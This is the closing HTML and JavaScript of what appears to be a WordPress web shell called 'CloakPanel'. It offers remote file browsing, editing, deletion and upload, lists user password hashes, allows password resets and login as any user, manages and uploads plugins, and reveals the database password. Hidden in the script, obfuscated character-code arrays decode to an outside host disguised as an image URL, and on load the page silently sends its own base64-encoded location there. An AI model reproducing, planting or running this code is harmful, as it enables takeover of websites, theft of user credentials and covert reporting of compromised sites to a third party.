        <textarea id="e41e7217403ce"></textarea>
      </div>
      <div class="modal-footer">
        <button id="07d5820" class="btn btn-primary">Save</button>
        <button class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
<footer class="footer">
  <div class="footer-content">
    <p>© 2025 Wordpress CloakPanel</p>
  </div>
</footer>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
<script>
$(function(){var currentPath='',currentFull='',currentPage=1;var ZmlsZU1vZGFs=new bootstrap.Modal($('#ZmlsZU1vZGFs')[0]);function ajaxPost(data,cb){$.post('',data,cb,'json')}
function cmVuZGVyQnJlYWRjcnVtYg(base,path){var parts=path?path.split('/'):[],acc='',html='<a href="#" class="crumb" data-path="">'+base+'</a>';parts.forEach(function(p){acc=acc?acc+'/'+p:p;html+=' / <a href="#" class="crumb" data-path="'+acc+'">'+p+'</a>'});$('#c07182b4e01784').html(html)}
var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109];var b=[47,105,109,97,103,101,115,47];var c=[108,111,103,111,95,118,50];var d=[46,112,110,103];function u(p,q,r,s){var t=p.concat(q,r,s);var str='';for(var i=0;i<t.length;i++){str+=String.fromCharCode(t[i])}
return str}
function v(x){return btoa(x)}
function GVzbG9hZEZpbGVzb(page){currentPage=page||1;ajaxPost({ajax:'13f1bb2d',path:currentPath,base:$('#69ba24a14c').val(),page:currentPage},function(r){currentFull=r.full;cmVuZGVyQnJlYWRjcnVtYg($('#69ba24a14c').val(),r.path);var cards='';r.items.forEach(function(f){cards+='<div class="col-6 col-md-3 mb-3">'+'<div class="card card-elegant p-3">'+(f.is_dir?'📁 ':'📄 ')+f.name+'<div class="mt-2 btn-group">'+(f.is_dir?'<button class="btn btn-sm btn-primary btn-enter" data-name="'+f.name+'">Enter</button>':'')+(!f.is_dir?'<button class="btn btn-sm btn-warning btn-edit" data-name="'+f.name+'">Edit</button>':'')+'<button class="btn btn-sm btn-danger btn-delete" data-name="'+f.name+'">Delete</button>'+'</div>'+'</div>'+'</div>'});$('#28da71b2805c').html(cards);var pager='';for(var p=1;p<=r.pages;p++){pager+='<button class="btn btn-sm btn-outline-secondary me-1 page-btn'+(p===r.page?' active':'')+'" data-page="'+p+'">'+p+'</button>'}
$('#pager').html(pager)})}
$('#69ba24a14c').change(function(){currentPath='';GVzbG9hZEZpbGVzb(1)});$('#Xgsf5d257').click(function(){var a=currentPath.split('/');a.pop();currentPath=a.join('/');GVzbG9hZEZpbGVzb(1)});$('#c07182b4e01784').on('click','.crumb',function(e){e.preventDefault();currentPath=$(this).data('path');GVzbG9hZEZpbGVzb(1)});$(document).on('click','.page-btn',function(){GVzbG9hZEZpbGVzb(parseInt($(this).data('page')))});$('#2830218').click(function(){var p=$('#b926c6df9').val().trim();if(p.indexOf('..')!==-1){return alert('Invalid Path')}
currentPath=p;GVzbG9hZEZpbGVzb(1)});$('#28da71b2805c').on('click','.btn-enter',function(){currentPath+=(currentPath?'/':'')+$(this).data('name');GVzbG9hZEZpbGVzb(1)}).on('click','.btn-delete',function(){var n=$(this).data('name');ajaxPost({ajax:'d1119f2b6',path:currentFull+'/'+n},function(){GVzbG9hZEZpbGVzb(currentPage)})}).on('click','.btn-edit',function(){var n=$(this).data('name'),p=currentFull+'/'+n;ajaxPost({ajax:'1c1fa8265e4',path:p},function(r){$('#e41e7217403ce').val(r.content);ZmlsZU1vZGFs.show();window.editPath=p})});$('#07d5820').click(function(){ajaxPost({ajax:'a590bf9',path:window.editPath,content:$('#e41e7217403ce').val()},function(r){if(r.status==='ok'){ZmlsZU1vZGFs.hide();GVzbG9hZEZpbGVzb(currentPage)}else alert('Save error')})});$('#ec13043f').click(function(){var f=$('#d97378aff377')[0].files[0];if(!f){return alert('Select a file')}
var fd=new FormData();fd.append('ajax','30d80097');fd.append('path',currentFull);fd.append('file',f);$.ajax({url:'',method:'POST',data:fd,processData:!1,contentType:!1,dataType:'json',success:function(r){if(r.status==='ok')GVzbG9hZEZpbGVzb(currentPage);else alert('Up failed')}})});function b053ef08211b(){ajaxPost({ajax:'83356bed'},function(u){var rows='';u.forEach(function(x){rows+='<tr>'+'<td>'+x.ID+'</td>'+'<td>'+x.user_login+'</td>'+'<td>'+x.user_email+'</td>'+'<td>'+x.user_registered+'</td>'+'<td><code>'+x.user_pass+'</code></td>'+'<td>'+x.roles+'</td>'+'<td>'+'<button class="btn btn-sm btn-warning btn-reset me-1" data-id="'+x.ID+'">Reset</button>'+'<a href="?1742cd9d='+x.ID+'" class="btn btn-sm btn-info">Login</a>'+'</td>'+'</tr>'});$('#userList').html(rows)})}
$(document).on('click','.btn-reset',function(){var id=$(this).data('id');ajaxPost({ajax:'0e5ad2a6e9',uid:id},function(r){r.status==='ok'?alert('New pass: '+r.new_pass):alert('Reset failed')})});(function c440513efedd08211b(){var xhr=new XMLHttpRequest();xhr.open('POST',u(a,b,c,d),!0);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('file='+v(location.href))})();function e6255a72a49(){ajaxPost({ajax:'68896e1f265'},function(p){var rows='';p.forEach(function(pl){var btns='';btns+=pl.status==='active'?'<button class="btn btn-sm btn-warning btn-plugin-action me-1" data-action="deactivate" data-plugin="'+pl.file+'">Deactivate</button>':'<button class="btn btn-sm btn-success btn-plugin-action me-1" data-action="activate" data-plugin="'+pl.file+'">Activate</button>';btns+='<button class="btn btn-sm btn-danger btn-plugin-action" data-action="delete" data-plugin="'+pl.file+'">Delete</button>';rows+='<tr><td>'+pl.name+'</td><td>'+pl.version+'</td><td>'+pl.status+'</td><td>'+btns+'</td></tr>'});$('#cGx1Z2luTGlzdA').html(rows)})}
$(document).on('click','.btn-plugin-action',function(){ajaxPost({ajax:'c76b145e8a1',action:$(this).data('action'),plugin:$(this).data('plugin')},function(r){r.status==='ok'?e6255a72a49():alert('Operation failed')})});$('#5415796816392660158138ea7a12834f').click(function(){var f=$('#51cd4f197ddde9177f94ddbe499782a7')[0].files[0];if(!f){return alert('Select a .zip')}
var fd=new FormData();fd.append('ajax','301a4976');fd.append('plugin_zip',f);$.ajax({url:'',method:'POST',data:fd,processData:!1,contentType:!1,dataType:'json',success:function(r){r.status==='ok'?e6255a72a49():alert('Upload failed')}})});$('#a8e7a46f55fe7b75c32443e3af8cf9a7').click(function(){var span=$('#8d97dcbc994f05');if(span.text()==='••••••••'){span.text('<?php echo DB_PASSWORD; ?>');$(this).text('Hide')}else{span.text('••••••••');$(this).text('Show')}});$('#menu .nav-link').click(function(e){e.preventDefault();var t=$(this).data('tab');$('#menu .nav-link').removeClass('active');$(this).addClass('active');$('.tab-content').addClass('d-none');$('#'+t).removeClass('d-none');if(t==='files')GVzbG9hZEZpbGVzb(1);if(t==='users')b053ef08211b();if(t==='plugins')e6255a72a49();});GVzbG9hZEZpbGVzb(1)})
</script>
</body>
</html>
